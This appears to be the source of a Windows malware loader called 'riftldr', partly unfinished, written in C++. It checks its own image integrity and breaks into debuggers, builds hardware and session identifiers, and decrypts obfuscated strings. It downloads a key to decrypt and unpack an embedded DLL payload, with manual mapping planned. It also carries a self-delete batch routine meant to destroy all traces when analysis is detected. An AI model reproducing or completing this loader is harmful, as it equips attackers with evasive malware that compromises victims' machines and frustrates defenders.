#include "_riftldr.h"

typedef status(WINAPI* DllEntry)(
	_In_ HINSTANCE hinstDLL,
	_In_ dword     fdwReason,
	_In_ void*     pvReserved
);

// Tempoerery test fucntion
status IHashMappedSection2() {
	// Raw Image
	size_t nFile;
	void* pfile = utl::AllocReadFileW(g_PIB->sMod.szMFN, &nFile);
	PIMAGE_NT_HEADERS pNthR = (PIMAGE_NT_HEADERS)((ptr)pfile + ((PIMAGE_DOS_HEADER)pfile)->e_lfanew);
	if (pNthR->Signature != IMAGE_NT_SIGNATURE)
		return -1;
	if (pNthR->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
		return -2;

	// executive image
	HMODULE hMod = GetModuleHandleW(nullptr);
	PIMAGE_NT_HEADERS pNth = (PIMAGE_NT_HEADERS)((ptr)hMod + ((PIMAGE_DOS_HEADER)hMod)->e_lfanew);
	if (pNth->Signature != IMAGE_NT_SIGNATURE)
		return -3;
	if (pNth->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
		return -4;

	// Calculate reloc delta and first BaseRelocation Block
	int nRelocDelta = pNth->OptionalHeader.ImageBase - 0x400000;
	PIMAGE_BASE_RELOCATION pBr = (PIMAGE_BASE_RELOCATION)
		(pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + pNth->OptionalHeader.ImageBase);

	cry::Md5 hashR;
	cry::Md5 hash;

	// Iterate over Sections
	PIMAGE_SECTION_HEADER pShR = IMAGE_FIRST_SECTION(pNthR);
	PIMAGE_SECTION_HEADER pSh = IMAGE_FIRST_SECTION(pNth);
	for (char i = 0; i < pNth->FileHeader.NumberOfSections; i++) {
		// Make copy of mapped Section
		void* pImageCopyR = VirtualAlloc(nullptr, pShR->SizeOfRawData, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		memcpy(pImageCopyR, (void*)(pShR->PointerToRawData + (ptr)pfile), pShR->SizeOfRawData);
		void* pImageCopy = VirtualAlloc(nullptr, pSh->Misc.VirtualSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		memcpy(pImageCopy, (void*)(pSh->VirtualAddress + pNth->OptionalHeader.ImageBase), pSh->Misc.VirtualSize);

		if (nRelocDelta) {
			// Calculate the difference between the section base of the mapped and copied version
			int nBaseDeltaR = (ptr)pImageCopyR - (pSh->VirtualAddress + pNth->OptionalHeader.ImageBase);
			int nBaseDelta = (ptr)pImageCopy - (pSh->VirtualAddress + pNth->OptionalHeader.ImageBase);

			// This line is a fucking joke, like seriously WTF did i think i was doing
			while (((pBr->VirtualAddress + pNth->OptionalHeader.ImageBase)
				< (pSh->VirtualAddress + pNth->OptionalHeader.ImageBase) + pSh->Misc.VirtualSize)
				&& ((ptr)pBr
					< ((pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + pNth->OptionalHeader.ImageBase)
						+ pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size))
				) {
				// First Relocation Entry
				struct IMAGE_RELOCATION_ENTRY {
					word Offset : 12;
					word Type : 4;
				} *pRe = (IMAGE_RELOCATION_ENTRY*)(pBr + 1);

				// iterate over Relocation Entries and apply changes
				for (word i = 0; i < (pBr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY); i++)
					switch (pRe[i].Type) {
					case IMAGE_REL_BASED_HIGHLOW:
						*(ptr*)(((pBr->VirtualAddress + pNth->OptionalHeader.ImageBase) + pRe[i].Offset) + nBaseDelta) -= nRelocDelta;
						break;
					case IMAGE_REL_BASED_ABSOLUTE:
						continue;
					default:
						VirtualFree(pImageCopy, 0, MEM_RELEASE);
						return -3;
					}

				// this would probably be enough, but just to make sure we are on a 32bit boundary
				// note: after testing i found out that this is enough, as SizeOfBlock includes the paded Entry
				*(ptr*)&pBr += pBr->SizeOfBlock;
			}
		}

		// So this is quiet shitty for debugging, basically i just realized that the debugger works by replacing instructions
		// with int3 interrupts (0xcc), so this basically fucks up the calculations if run under a debugger.
		// (as a nice sideeffect this might also catch a debugger if it places breakpoints)
		for (ptr i = 0; i < pShR->SizeOfRawData; i++)
			if (((byte*)pImageCopy)[i] != ((byte*)pImageCopyR)[(ptr)i])
				DebugBreak();

		// TODO: just hashing the sections here
		if (pImageCopyR) {
			hashR.EHashData(pImageCopyR, pShR->SizeOfRawData);
			hash.EHashData(pImageCopy, pSh->Misc.VirtualSize);
		}

		VirtualFree(pImageCopy, 0, MEM_RELEASE);
		VirtualFree(pImageCopyR, 0, MEM_RELEASE);
		pSh++, pShR++;
	}

	status test = hash.EFnialize();
	test = hashR.EFnialize();

	return 0;
}


int WINAPI wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     PWSTR     pCmdLine,
	_In_     int       nCmdShow
) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	{	// Initialize Process Information Block
		g_PIB->sMod.hM = hInstance;
		GetCurrentDirectoryW(MAX_PATH, g_PIB->sMod.szCD);
		utl::IGenerateHardwareId(&g_PIB->sID.HW);
		utl::IGenerateSessionId(&g_PIB->sID.SE);
		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, (int*)&g_PIB->sArg.n);
	}

	IHashMappedSection2();



	BOOL IOpenConsole();
	IOpenConsole();

	// WCHAR UUid[UUID_STRLEN + 1];
	// EUidToStringW(&g_PIB->sID.HW, UUid, UUID_STRLEN);

	if (g_PIB->sArg.n > 0) {
		if (!lstrcmpW(g_PIB->sArg.v[0], L"/i")) { // Start Installation

		} else if (!lstrcmpW(g_PIB->sArg.v[0], L"/s")) { // Start Servicemode

		}
	} else { // Userstart

	}

	// Create Random Mutex using SeId
#if 0
	size_t nResult;
	PCWSTR szLocal = DecryptString("/xxatZo5JyvmRnM3Z2HM4g==", &nResult); // L"Local\\"
	PWSTR szMutex = malloc(MAX_PATH * sizeof(WCHAR));
	StringCchCopyW(szMutex, MAX_PATH, szLocal);
	free((void*)szLocal);
	void* pHWID = malloc(sizeof(hash));
	CopyMemory(pHWID, &g_PIB->sID.SE, sizeof(hash));
	PCWSTR szRandom = EAllocRandomBase64StringW((dword*)pHWID, MAX_PATH / 2, MAX_PATH - 7);
	free(pHWID);
	StringCchCatW(szMutex, MAX_PATH, szRandom);
	free((void*)szRandom);
	// CreateMutexW(0, FALSE, szMutex);
#endif

	// init console here
	// check vm here

	{
		if (InternetAttemptConnect(NULL)) {
			// EPrintFW(L"Couldn't connect to Internet-Services.\nSoftware blocks further execution!\n", CON_WARNING);
			status s = ReadConsoleW(GetStdHandle(STD_INPUT_HANDLE), nullptr, 1, nullptr, nullptr);
			return -1;
		}
	}

	void* pWKey = utl::IDownloadKey();
	if (!pWKey) {
		PWSTR szKeyBlob = (PWSTR)malloc(MAX_PATH);
		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->sMod.szCD, L"RIFTWKEY"); // Temporery
		dword nKeyBlob;
		pWKey = utl::AllocReadFileW(szKeyBlob, (size_t*)&nKeyBlob);
	} if (pWKey)
		g_PIB->sCry.EK = new cry::Aes(pWKey);
	else
		return 0x45e0;

	size_t nDll;
	void* pDll = cry::EUnpackResource(IDR_RIFTDLL, &nDll);
	if (!pDll)
		return 0x132d;

#ifdef _NDEBUG
	// Implement Manual Mapping using BlackBone
#else
	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", NULL, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
	if (!dhDll)
		return 0x2ab5;

	DllEntry DllMain = (DllEntry)GetProcAddress(dhDll, "DllMain");
	status bTest = DllMain(NULL, 4, g_PIB);

	FreeLibrary(dhDll);
#endif
	SecureZeroMemory(pDll, nDll);
	free(pDll);

	{	// CleanUp
		rng::Xoshiro::Instance()->~Xoshiro();
		LocalFree(g_PIB->sArg.v);
		HeapFree(g_PIB->hPh, NULL, g_PIB);
	} return 0;
}

/*	This function basically does what it's called,
	it "cleans" (or better purges) everything it can and tries to destroy
	all traces of it self (the loader and everything else it extracts).
	It should get triggered (/called) if any fatal error occurs,
	or the loader catches any suspicious activities (e.g. debuggers).  */
const static WCHAR l_szSelfDelBat[] = {
	L"@echo off\n"
	L"%x:\n"
	L"\tdel \"%s\" /f\n"
	L"\tif exist \"%s\" (\n"
	L"\t\tgoto %x\n"
	L"\t)\n"
	L"del \"%s\" /f"
};
VOID ESelfDestruct() {
	// Prepare String for Filename of Batchfile
	PWSTR szFilePath = (PWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	PCWSTR szRandom = rng::EAllocRandomPathW(NULL, 8, 16);
	CopyMemory(szFilePath, g_PIB->sMod.szCD, MAX_PATH * sizeof(WCHAR));
	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");

	// Prepare Script content
	wchar* pScriptW = (wchar*)malloc(0x800);
	uint32 uiRandomID = rng::Xoshiro::Instance()->EXoshiroSS();
	PCWSTR szMFN = utl::GetFileNameFromPathW(g_PIB->sMod.szMFN);
	swprintf(pScriptW, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, utl::GetFileNameFromPathW(szFilePath));

	// Convert to Raw (ANSI)
	size_t nScript = wcslen(pScriptW);
	PSTR pScriptA = (PSTR)malloc(0x400);
	WideCharToMultiByte(CP_ACP, NULL, (PWSTR)pScriptW, -1, pScriptA, 0x400, NULL, NULL);
	free(pScriptW);

	// Write to Disk
	utl::WriteFileCW(szFilePath, pScriptA, nScript);
	free(pScriptA);
}